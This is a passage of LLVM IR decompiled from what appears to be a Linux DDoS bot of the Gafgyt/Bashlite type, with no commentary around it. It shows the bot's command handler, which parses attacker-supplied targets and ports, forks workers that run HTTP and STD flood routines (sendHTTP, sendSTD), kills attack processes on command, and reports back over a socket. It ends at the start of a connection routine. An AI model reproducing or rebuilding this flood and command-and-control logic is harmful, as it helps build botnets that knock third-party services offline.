  %v1_804f9c3 = icmp eq i32 %v0_804f9be, 0
  %v1_804f9c5 = icmp eq i1 %v1_804f9c3, false
  br i1 %v1_804f9c5, label %dec_label_pc_804fa44, label %dec_label_pc_804f9c7

dec_label_pc_804f9c7:                             ; preds = %dec_label_pc_804f9be
  %v1_804f9ca = add i32 %tmp141, 24
  %v5_804f9ca = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f9ca, i1* %cf.global-to-local, align 1
  %v1_804f9cd = inttoptr i32 %v1_804f9ca to i32*
  %v2_804f9cd = load i32, i32* %v1_804f9cd, align 4
  %v1_804f9d2 = call i32 @atol(i32 %v2_804f9cd)
  store i32 %v1_804f9d2, i32* @ebx, align 4
  %v1_804f9dc = add i32 %tmp141, 20
  %v5_804f9dc = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804f9dc, i1* %cf.global-to-local, align 1
  %v1_804f9df = inttoptr i32 %v1_804f9dc to i32*
  %v2_804f9df = load i32, i32* %v1_804f9df, align 4
  %v1_804f9e4 = call i32 @atol(i32 %v2_804f9df)
  store i32 %v1_804f9e4, i32* @esi, align 4
  %v1_804f9ee = add i32 %tmp141, 16
  %v1_804f9f1 = inttoptr i32 %v1_804f9ee to i32*
  %v2_804f9f1 = load i32, i32* %v1_804f9f1, align 4
  store i32 %v2_804f9f1, i32* @edi, align 4
  %v1_804f9f8 = add i32 %tmp141, 12
  %v5_804f9f8 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804f9f8, i1* %cf.global-to-local, align 1
  %v1_804f9fb = inttoptr i32 %v1_804f9f8 to i32*
  %v2_804f9fb = load i32, i32* %v1_804f9fb, align 4
  %v1_804fa00 = call i32 @atol(i32 %v2_804f9fb)
  %v1_804fa05 = urem i32 %v1_804fa00, 65536
  store i32 %v1_804fa05, i32* %edx.global-to-local, align 4
  %v1_804fa0d = add i32 %tmp141, 8
  %v1_804fa10 = inttoptr i32 %v1_804fa0d to i32*
  %v2_804fa10 = load i32, i32* %v1_804fa10, align 4
  store i1 %v5_804f981, i1* %cf.global-to-local, align 1
  %v2_804fa1a = load i32, i32* %v1_804f984, align 4
  %v0_804fa1c = load i32, i32* @ebx, align 4
  %v0_804fa20 = load i32, i32* @esi, align 4
  %v0_804fa24 = load i32, i32* @edi, align 4
  %v6_804fa33 = trunc i32 %v1_804fa00 to i16
  %v7_804fa33 = call i32 @sendHTTP(i32 %v2_804fa1a, i32 %v2_804fa10, i16 %v6_804fa33, i32 %v0_804fa24, i32 %v0_804fa20, i32 %v0_804fa1c)
  %v1_804fa3f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fa44:                             ; preds = %dec_label_pc_804f9be
  %v2_804fa53 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fa5b = icmp eq i32 %v2_804fa53, 0
  %v1_804fa5f = icmp eq i1 %v4_804fa5b, false
  br i1 %v1_804fa5f, label %dec_label_pc_804f9be, label %dec_label_pc_804faf4

dec_label_pc_804fa6a:                             ; preds = %dec_label_pc_804f97e
  %v0_804fa6a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fa6f = icmp eq i32 %v0_804fa6a, 0
  %v1_804fa71 = icmp eq i1 %v1_804fa6f, false
  br i1 %v1_804fa71, label %dec_label_pc_804fe04, label %dec_label_pc_804fa77

dec_label_pc_804fa77:                             ; preds = %dec_label_pc_804fa6a
  %v1_804fa7a = add i32 %tmp141, 24
  %v5_804fa7a = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804fa7a, i1* %cf.global-to-local, align 1
  %v1_804fa7d = inttoptr i32 %v1_804fa7a to i32*
  %v2_804fa7d = load i32, i32* %v1_804fa7d, align 4
  %v1_804fa82 = call i32 @atol(i32 %v2_804fa7d)
  store i32 %v1_804fa82, i32* @ebx, align 4
  %v1_804fa8c = add i32 %tmp141, 20
  %v5_804fa8c = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804fa8c, i1* %cf.global-to-local, align 1
  %v1_804fa8f = inttoptr i32 %v1_804fa8c to i32*
  %v2_804fa8f = load i32, i32* %v1_804fa8f, align 4
  %v1_804fa94 = call i32 @atol(i32 %v2_804fa8f)
  store i32 %v1_804fa94, i32* @esi, align 4
  %v1_804fa9e = add i32 %tmp141, 16
  %v1_804faa1 = inttoptr i32 %v1_804fa9e to i32*
  %v2_804faa1 = load i32, i32* %v1_804faa1, align 4
  store i32 %v2_804faa1, i32* @edi, align 4
  %v1_804faa8 = add i32 %tmp141, 12
  %v5_804faa8 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804faa8, i1* %cf.global-to-local, align 1
  %v1_804faab = inttoptr i32 %v1_804faa8 to i32*
  %v2_804faab = load i32, i32* %v1_804faab, align 4
  %v1_804fab0 = call i32 @atol(i32 %v2_804faab)
  %v1_804fab5 = urem i32 %v1_804fab0, 65536
  store i32 %v1_804fab5, i32* %edx.global-to-local, align 4
  %v1_804fabd = add i32 %tmp141, 8
  %v1_804fac0 = inttoptr i32 %v1_804fabd to i32*
  %v2_804fac0 = load i32, i32* %v1_804fac0, align 4
  store i1 %v5_804f981, i1* %cf.global-to-local, align 1
  %v2_804faca = load i32, i32* %v1_804f984, align 4
  %v0_804facc = load i32, i32* @ebx, align 4
  %v0_804fad0 = load i32, i32* @esi, align 4
  %v0_804fad4 = load i32, i32* @edi, align 4
  %v6_804fae3 = trunc i32 %v1_804fab0 to i16
  %v7_804fae3 = call i32 @sendHTTP(i32 %v2_804faca, i32 %v2_804fac0, i16 %v6_804fae3, i32 %v0_804fad4, i32 %v0_804fad0, i32 %v0_804facc)
  %v1_804faef = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804faf4:                             ; preds = %dec_label_pc_804fa44, %dec_label_pc_804f99e, %dec_label_pc_804f929
  %v2_804faf7 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fb14 = inttoptr i32 %v2_804faf7 to i8*
  store i32 %v2_804faf7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80595b7.428 to i32), i32* @edi, align 4
  %v7_804fb26 = call i32 @_strncmp(i8* %v4_804fb14, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80595b7.428, i32 0, i32 0), i32 4)
  %v8_804fb26 = urem i32 %v7_804fb26, 2
  %v9_804fb26 = icmp eq i32 %v8_804fb26, 0
  %v0_804fb28 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fb28 = or i1 %v0_804fb28, %v9_804fb26
  %v3_804fb28 = zext i1 %v2_804fb28 to i32
  %v4_804fb28 = load i32, i32* @edx, align 4
  %v5_804fb28 = and i32 %v4_804fb28, -256
  %v6_804fb28 = or i32 %v3_804fb28, %v5_804fb28
  %v7_804fb28 = xor i32 %v6_804fb28, 1
  store i32 %v7_804fb28, i32* @edx, align 4
  %v1_804fb30 = trunc i32 %v7_804fb28 to i8
  %v3_804fb30 = zext i1 %v0_804fb28 to i8
  %v15_804fb30 = icmp eq i8 %v1_804fb30, %v3_804fb30
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fb39 = icmp eq i1 %v15_804fb30, false
  br i1 %v1_804fb39, label %dec_label_pc_804fc66, label %dec_label_pc_804fb3f

dec_label_pc_804fb3f:                             ; preds = %dec_label_pc_804faf4
  %v9_804fb3f = icmp ult i32 %arg1, 3
  store i1 %v9_804fb3f, i1* %cf.global-to-local, align 1
  %v7_804fb43 = icmp sgt i32 %arg1, 3
  br i1 %v7_804fb43, label %dec_label_pc_804fb45, label %dec_label_pc_804fb6d

dec_label_pc_804fb45:                             ; preds = %dec_label_pc_804fb3f
  %v1_804fb48 = add i32 %tmp141, 8
  %v5_804fb48 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804fb48, i1* %cf.global-to-local, align 1
  %v1_804fb4b = inttoptr i32 %v1_804fb48 to i32*
  %v2_804fb4b = load i32, i32* %v1_804fb4b, align 4
  %v1_804fb50 = call i32 @atol(i32 %v2_804fb4b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp152 = icmp slt i32 %v1_804fb50, 1
  br i1 %tmp152, label %dec_label_pc_804fb6d, label %dec_label_pc_804fb59

dec_label_pc_804fb59:                             ; preds = %dec_label_pc_804fb45
  %v1_804fb5c = add i32 %tmp141, 12
  %v5_804fb5c = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804fb5c, i1* %cf.global-to-local, align 1
  %v1_804fb5f = inttoptr i32 %v1_804fb5c to i32*
  %v2_804fb5f = load i32, i32* %v1_804fb5f, align 4
  %v1_804fb64 = call i32 @atol(i32 %v2_804fb5f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp153 = icmp slt i32 %v1_804fb64, 1
  %tmp154 = icmp eq i1 %tmp153, false
  br i1 %tmp154, label %dec_label_pc_804fb87, label %dec_label_pc_804fb6d

dec_label_pc_804fb6d:                             ; preds = %dec_label_pc_804fb3f, %dec_label_pc_804fb59, %dec_label_pc_804fb45
  %v0_804fb6d = load i32, i32* @global_var_805b540.20, align 64
  %v2_804fb7d = call i32 @sockprintf(i32 %v0_804fb6d, i32 ptrtoint ([27 x i8]* @global_var_80595bb.429 to i32))
  br label %dec_label_pc_804fe04

dec_label_pc_804fb87:                             ; preds = %dec_label_pc_804fb59
  %v1_804fb8a = add i32 %tmp141, 4
  %v1_804fb8d = inttoptr i32 %v1_804fb8a to i32*
  %v2_804fb8d = load i32, i32* %v1_804fb8d, align 4
  store i1 %v5_804fb48, i1* %cf.global-to-local, align 1
  %v2_804fb98 = load i32, i32* %v1_804fb4b, align 4
  %v1_804fb9d = call i32 @atol(i32 %v2_804fb98)
  store i1 %v5_804fb5c, i1* %cf.global-to-local, align 1
  %v2_804fbab = load i32, i32* %v1_804fb5f, align 4
  %v1_804fbb0 = call i32 @atol(i32 %v2_804fbab)
  %v2_804fbc6 = inttoptr i32 %v2_804fb8d to i8*
  %v3_804fbc6 = call i32 @__GI_strchr(i8* %v2_804fbc6, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fbcb = icmp eq i32 %v3_804fbc6, 0
  br i1 %v1_804fbcb, label %dec_label_pc_804fc34, label %dec_label_pc_804fbcf

dec_label_pc_804fbcf:                             ; preds = %dec_label_pc_804fb87
  store i32 %v2_804fb8d, i32* @eax, align 4
  %v2_804fbdd = call i32 @__GI_strtok(i32 %v2_804fb8d, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fc2c17 = icmp eq i32 %v2_804fbdd, 0
  %v1_804fc3024 = icmp eq i1 %v4_804fc2c17, false
  br i1 %v1_804fc3024, label %dec_label_pc_804fbe7, label %dec_label_pc_804fc66

dec_label_pc_804fbe7:                             ; preds = %dec_label_pc_804fbcf, %dec_label_pc_804fc15
  %storemerge1325 = phi i32 [ %v2_804fc24, %dec_label_pc_804fc15 ], [ %v2_804fbdd, %dec_label_pc_804fbcf ]
  %v0_804fbe7 = call i32 @listFork()
  store i32 %v0_804fbe7, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fbec = icmp eq i32 %v0_804fbe7, 0
  %v1_804fbee = icmp eq i1 %v1_804fbec, false
  br i1 %v1_804fbee, label %dec_label_pc_804fc15, label %dec_label_pc_804fbf0

dec_label_pc_804fbf0:                             ; preds = %dec_label_pc_804fbe7
  %v3_804fc04 = call i32 @sendSTD(i32 %storemerge1325, i32 %v1_804fb9d, i32 %v1_804fbb0)
  %v1_804fc10 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fc15:                             ; preds = %dec_label_pc_804fbe7
  %v2_804fc24 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fc2c = icmp eq i32 %v2_804fc24, 0
  %v1_804fc30 = icmp eq i1 %v4_804fc2c, false
  br i1 %v1_804fc30, label %dec_label_pc_804fbe7, label %dec_label_pc_804fc66

dec_label_pc_804fc34:                             ; preds = %dec_label_pc_804fb87
  %v0_804fc34 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fc39 = icmp eq i32 %v0_804fc34, 0
  %v1_804fc3b = icmp eq i1 %v1_804fc39, false
  br i1 %v1_804fc3b, label %dec_label_pc_804fe04, label %dec_label_pc_804fc41

dec_label_pc_804fc41:                             ; preds = %dec_label_pc_804fc34
  %v3_804fc55 = call i32 @sendSTD(i32 %v2_804fb8d, i32 %v1_804fb9d, i32 %v1_804fbb0)
  %v1_804fc61 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fc66:                             ; preds = %dec_label_pc_804fc15, %dec_label_pc_804fbcf, %dec_label_pc_804faf4
  %v2_804fc69 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fc86 = inttoptr i32 %v2_804fc69 to i8*
  %v7_804fc98 = call i32 @_strncmp(i8* %v4_804fc86, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80595d6.430, i32 0, i32 0), i32 9)
  %v8_804fc98 = urem i32 %v7_804fc98, 2
  %v9_804fc98 = icmp eq i32 %v8_804fc98, 0
  %v0_804fc9a = load i1, i1* %cf.global-to-local, align 1
  %v2_804fc9a = or i1 %v0_804fc9a, %v9_804fc98
  %v3_804fc9a = zext i1 %v2_804fc9a to i32
  %v4_804fc9a = load i32, i32* @edx, align 4
  %v5_804fc9a = and i32 %v4_804fc9a, -256
  %v6_804fc9a = or i32 %v3_804fc9a, %v5_804fc9a
  %v7_804fc9a = xor i32 %v6_804fc9a, 1
  store i32 %v7_804fc9a, i32* @edx, align 4
  %v1_804fca2 = trunc i32 %v7_804fc9a to i8
  %v3_804fca2 = zext i1 %v0_804fc9a to i8
  %v15_804fca2 = icmp eq i8 %v1_804fca2, %v3_804fca2
  store i1 false, i1* @cf, align 1
  %v1_804fcab = icmp eq i1 %v15_804fca2, false
  br i1 %v1_804fcab, label %dec_label_pc_804fdb1, label %dec_label_pc_804fd1a

dec_label_pc_804fcc1:                             ; preds = %dec_label_pc_804fd57, %dec_label_pc_804fd1a
  %v2_804fcc4 = mul i32 %storemerge1, 4
  %v9_804fcc4 = and i32 %storemerge1, 1073741824
  %v10_804fcc4 = icmp ne i32 %v9_804fcc4, 0
  store i32 %v2_804fcc4, i32* %edx.global-to-local, align 4
  %v0_804fcc9 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804fcce = add i32 %v0_804fcc9, %v2_804fcc4
  %v1_804fcd1 = inttoptr i32 %v2_804fcce to i32*
  %v2_804fcd1 = load i32, i32* %v1_804fcd1, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fcd3 = icmp eq i32 %v2_804fcd1, 0
  br i1 %v1_804fcd3, label %dec_label_pc_804fd17, label %dec_label_pc_804fcd7

dec_label_pc_804fcd7:                             ; preds = %dec_label_pc_804fcc1
  store i1 %v10_804fcc4, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcc4, i32* %edx.global-to-local, align 4
  %v2_804fce7 = load i32, i32* %v1_804fcd1, align 4
  store i32 %v2_804fce7, i32* @ebx, align 4
  %v0_804fce9 = call i32 @__libc_getpid()
  %v0_804fcee = load i32, i32* @ebx, align 4
  %v7_804fcee = icmp ult i32 %v0_804fcee, %v0_804fce9
  store i1 %v7_804fcee, i1* %cf.global-to-local, align 1
  %v12_804fcee = icmp eq i32 %v0_804fcee, %v0_804fce9
  br i1 %v12_804fcee, label %dec_label_pc_804fd17, label %dec_label_pc_804fcf2

dec_label_pc_804fcf2:                             ; preds = %dec_label_pc_804fcd7
  store i1 %v10_804fcc4, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcc4, i32* %edx.global-to-local, align 4
  %v0_804fcfa = load i32, i32* @global_var_80617d4.36, align 4
  %v2_804fcff = add i32 %v0_804fcfa, %v2_804fcc4
  %v1_804fd02 = inttoptr i32 %v2_804fcff to i32*
  %v2_804fd02 = load i32, i32* %v1_804fd02, align 4
  %v2_804fd0f = call i32 @kill(i32 %v2_804fd02, i32 9)
  %v4_804fd14 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804fd17

dec_label_pc_804fd17:                             ; preds = %dec_label_pc_804fcd7, %dec_label_pc_804fcc1, %dec_label_pc_804fcf2
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804fcc1 ], [ %stack_var_-28.1, %dec_label_pc_804fcd7 ], [ %v4_804fd14, %dec_label_pc_804fcf2 ]
  %v4_804fd17 = add i32 %storemerge1, 1
  br label %dec_label_pc_804fd1a

dec_label_pc_804fd1a:                             ; preds = %dec_label_pc_804fc66, %dec_label_pc_804fd17
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804fd17 ], [ 0, %dec_label_pc_804fc66 ]
  %storemerge1 = phi i32 [ %v4_804fd17, %dec_label_pc_804fd17 ], [ 0, %dec_label_pc_804fc66 ]
  store i32 0, i32* @edi, align 4
  %v0_804fd2e = load i32, i32* @global_var_805b548.34, align 8
  %v0_804fd33 = load i32, i32* @global_var_805b54c.35, align 4
  store i32 %v0_804fd33, i32* %edx.global-to-local, align 4
  %v10_804fd4b = icmp ne i32 %v0_804fd33, 0
  store i1 %v10_804fd4b, i1* %cf.global-to-local, align 1
  br i1 %v10_804fd4b, label %dec_label_pc_804fcc1, label %dec_label_pc_804fd57

dec_label_pc_804fd57:                             ; preds = %dec_label_pc_804fd1a
  store i32 %v0_804fd2e, i32* @esi, align 4
  %v10_804fd6b = icmp ult i32 %storemerge1, %v0_804fd2e
  store i1 %v10_804fd6b, i1* %cf.global-to-local, align 1
  br i1 %v10_804fd6b, label %dec_label_pc_804fcc1, label %dec_label_pc_804fd77

dec_label_pc_804fd77:                             ; preds = %dec_label_pc_804fd57
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp155 = icmp slt i32 %stack_var_-28.1, 1
  %v0_804fd9c = load i32, i32* @global_var_805b540.20, align 64
  br i1 %tmp155, label %dec_label_pc_804fd9c, label %dec_label_pc_804fd7d

dec_label_pc_804fd7d:                             ; preds = %dec_label_pc_804fd77
  store i32 %v0_804fd9c, i32* %edx.global-to-local, align 4
  %v2_804fd95 = call i32 @sockprintf(i32 %v0_804fd9c, i32 ptrtoint ([11 x i8]* @global_var_80595df.431 to i32))
  br label %dec_label_pc_804fdb1

dec_label_pc_804fd9c:                             ; preds = %dec_label_pc_804fd77
  %v2_804fdac = call i32 @sockprintf(i32 %v0_804fd9c, i32 ptrtoint ([13 x i8]* @global_var_80595ea.432 to i32))
  br label %dec_label_pc_804fdb1

dec_label_pc_804fdb1:                             ; preds = %dec_label_pc_804fc66, %dec_label_pc_804fd7d, %dec_label_pc_804fd9c
  %v2_804fdb4 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fdd1 = inttoptr i32 %v2_804fdb4 to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_80595f7.433 to i32), i32* @edi, align 4
  %v7_804fde3 = call i32 @_strncmp(i8* %v4_804fdd1, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80595f7.433, i32 0, i32 0), i32 10)
  %v8_804fde3 = urem i32 %v7_804fde3, 2
  %v9_804fde3 = icmp eq i32 %v8_804fde3, 0
  %v0_804fde5 = load i1, i1* @cf, align 1
  %v2_804fde5 = or i1 %v0_804fde5, %v9_804fde3
  %v3_804fde5 = zext i1 %v2_804fde5 to i32
  %v4_804fde5 = load i32, i32* @edx, align 4
  %v5_804fde5 = and i32 %v4_804fde5, -256
  %v6_804fde5 = or i32 %v3_804fde5, %v5_804fde5
  %v7_804fde5 = xor i32 %v6_804fde5, 1
  store i32 %v7_804fde5, i32* %edx.global-to-local, align 4
  %v1_804fded = trunc i32 %v7_804fde5 to i8
  %v3_804fded = zext i1 %v0_804fde5 to i8
  %v4_804fded = sub nsw i8 %v1_804fded, %v3_804fded
  %v15_804fded = icmp eq i8 %v4_804fded, 0
  %v2_804fdf1 = sext i8 %v4_804fded to i32
  store i32 %v2_804fdf1, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fdf6 = icmp eq i1 %v15_804fded, false
  br i1 %v1_804fdf6, label %dec_label_pc_804fe04, label %dec_label_pc_804fdf8

dec_label_pc_804fdf8:                             ; preds = %dec_label_pc_804fdb1
  %v1_804fdff = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804fe04

dec_label_pc_804fe04:                             ; preds = %dec_label_pc_804f624, %dec_label_pc_804f5bb, %dec_label_pc_804f974, %dec_label_pc_804fdb1, %dec_label_pc_804fc34, %dec_label_pc_804fa6a, %dec_label_pc_804f646, %dec_label_pc_804f20e, %dec_label_pc_804f17f, %dec_label_pc_804fb6d, %dec_label_pc_804f778, %dec_label_pc_804f49c, %dec_label_pc_804f362, %dec_label_pc_804f237, %dec_label_pc_804f0c6, %dec_label_pc_804f065, %dec_label_pc_804fdf8
  %v0_804fe0e = phi i32 [ %v2_804f969, %dec_label_pc_804f974 ], [ %v2_804fdf1, %dec_label_pc_804fdb1 ], [ %v0_804fc34, %dec_label_pc_804fc34 ], [ %v0_804fa6a, %dec_label_pc_804fa6a ], [ %v0_804f646, %dec_label_pc_804f646 ], [ %v0_804f20e, %dec_label_pc_804f20e ], [ 0, %dec_label_pc_804f17f ], [ %v2_804fb7d, %dec_label_pc_804fb6d ], [ %v2_804f788, %dec_label_pc_804f778 ], [ %v2_804f4ac, %dec_label_pc_804f49c ], [ %v2_804f384, %dec_label_pc_804f362 ], [ %v1_804f21b, %dec_label_pc_804f237 ], [ %v2_804f0e0, %dec_label_pc_804f0c6 ], [ %v2_804f075, %dec_label_pc_804f065 ], [ %v1_804fdff, %dec_label_pc_804fdf8 ], [ %v2_804f5c9, %dec_label_pc_804f5bb ], [ %v2_804f633, %dec_label_pc_804f624 ]
  %v0_804fe04 = load i32, i32* @esp, align 4
  %v5_804fe04 = icmp ugt i32 %v0_804fe04, -349
  store i1 %v5_804fe04, i1* %cf.global-to-local, align 1
  %v2_804fe0a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fe0a, i32* @ebx, align 4
  store i32 %v0_804f016, i32* @esi, align 4
  store i32 %v0_804f015, i32* @edi, align 4
  ret i32 %v0_804fe0e

; uselistorder directives
  uselistorder i1 %v0_804fde5, { 1, 0 }
  uselistorder i32 %v0_804fd9c, { 2, 1, 0 }
  uselistorder i32 %v0_804fd2e, { 1, 0 }
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804fcc4, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804fc9a, { 1, 0 }
  uselistorder i32 %v2_804fc24, { 1, 0 }
  uselistorder i32 %v1_804fbb0, { 1, 0 }
  uselistorder i32 %v1_804fb9d, { 1, 0 }
  uselistorder i32 %v2_804fb8d, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804fb28, { 1, 0 }
  uselistorder i32 %v1_804fab0, { 1, 0 }
  uselistorder i32 %v1_804fa00, { 1, 0 }
  uselistorder i32* %v1_804f984, { 2, 0, 1, 3 }
  uselistorder i1 %v5_804f981, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804f95d, { 1, 0 }
  uselistorder i32 %v7_804f95b, { 1, 0 }
  uselistorder i32 %v2_804f8cf, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0, 2 }
  uselistorder i32 %storemerge6, { 1, 0, 2 }
  uselistorder i32 %v2_804f7dc, { 1, 0 }
  uselistorder i32 %v1_804f7ce, { 1, 0 }
  uselistorder i32 %v1_804f7bb, { 1, 0 }
  uselistorder i32 %v1_804f7a8, { 1, 0 }
  uselistorder i32 %v2_804f798, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f73f, { 1, 0 }
  uselistorder i32 %v1_804f73a, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804f6cf, { 1, 0 }
  uselistorder i32 %v2_804f633, { 0, 2, 1 }
  uselistorder i32 %v2_804f5c9, { 1, 0, 2 }
  uselistorder i32 %storemerge8, { 1, 0, 2 }
  uselistorder i32 %storemerge9157, { 1, 0 }
  uselistorder i32 %v1_804f51e, { 2, 1, 0 }
  uselistorder i32 %v1_804f505, { 1, 0 }
  uselistorder i32 %v1_804f4f2, { 1, 0 }
  uselistorder i32 %v1_804f4df, { 1, 0 }
  uselistorder i32 %v1_804f4cc, { 1, 0 }
  uselistorder i32 %v2_804f4bc, { 2, 1, 0, 3 }
  uselistorder i1 %v8_804f482, { 1, 0, 2 }
  uselistorder i32 %v1_804f47d, { 1, 0 }
  uselistorder i32 %v1_804f478, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804f466, { 1, 0 }
  uselistorder i32 %v1_804f461, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804f44f, { 1, 0 }
  uselistorder i32 %v1_804f44a, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804f3c2, { 1, 0 }
  uselistorder i1 %v0_804f34f, { 1, 0 }
  uselistorder i1 %v0_804f2c7, { 1, 0 }
  uselistorder i1 %v0_804f1f7, { 1, 0 }
  uselistorder i1 %v0_804f16c, { 1, 0 }
  uselistorder i1 %v0_804f11e, { 1, 0 }
  uselistorder i1 %v0_804f0b3, { 1, 0 }
  uselistorder i1 %v0_804f052, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp141, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 11, 10, 12, 13, 16, 14, 15, 17, 18, 20, 19, 21, 22, 23 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 124, 9, 11, 10, 125, 12, 13, 14, 15, 16, 17, 18, 19, 20, 126, 21, 22, 23, 24, 25, 31, 26, 27, 28, 29, 30, 127, 32, 33, 34, 35, 36, 121, 37, 39, 38, 122, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 96, 64, 66, 65, 128, 67, 68, 69, 70, 71, 72, 123, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 97, 98, 99, 101, 100, 102, 113, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 114, 115, 116, 117, 118, 119, 120 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8059131.303 to i32), { 2, 3, 1, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 2, 3, 1, 0, 4, 5 }
  uselistorder i32* inttoptr (i32 -13 to i32*), { 2, 0, 1, 3, 4 }
  uselistorder i32* %arg2, { 8, 9, 10, 11, 12, 2, 3, 4, 5, 6, 7, 13, 14, 1, 15, 16, 0, 17, 18, 19, 20, 23, 22, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 %arg1, { 9, 16, 8, 15, 0, 14, 7, 6, 13, 5, 12, 2, 4, 1, 11, 3, 10 }
  uselistorder label %dec_label_pc_804fe04, { 16, 3, 4, 9, 5, 2, 10, 6, 0, 1, 11, 12, 13, 7, 8, 14, 15 }
  uselistorder label %dec_label_pc_804fdb1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fd1a, { 1, 0 }
  uselistorder label %dec_label_pc_804fd17, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fbe7, { 1, 0 }
  uselistorder label %dec_label_pc_804fb6d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f9be, { 1, 0 }
  uselistorder label %dec_label_pc_804f929, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804f876, { 1, 0 }
  uselistorder label %dec_label_pc_804f83a, { 1, 0 }
  uselistorder label %dec_label_pc_804f809, { 1, 0 }
  uselistorder label %dec_label_pc_804f778, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804f75e, { 1, 0 }
  uselistorder label %dec_label_pc_804f5d3, { 1, 0 }
  uselistorder label %dec_label_pc_804f597, { 1, 0 }
  uselistorder label %dec_label_pc_804f566, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f49c, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804f1c0, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe0f = load i32, i32* @ebp, align 4
  store i32 %v0_804fe0f, i32* %stack_var_-4, align 4
  %v4_804fe0f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804fe0f, i32* @ebp, align 4
  %v2_804fe18 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804fe34 = bitcast i32* %stack_var_-4104 to i8*
  %v4_804fe34 = call i32 @__GI_memset(i8* %v3_804fe34, i32 0, i32 4096)
  %v0_804fe39 = load i32, i32* @global_var_805b540.20, align 64
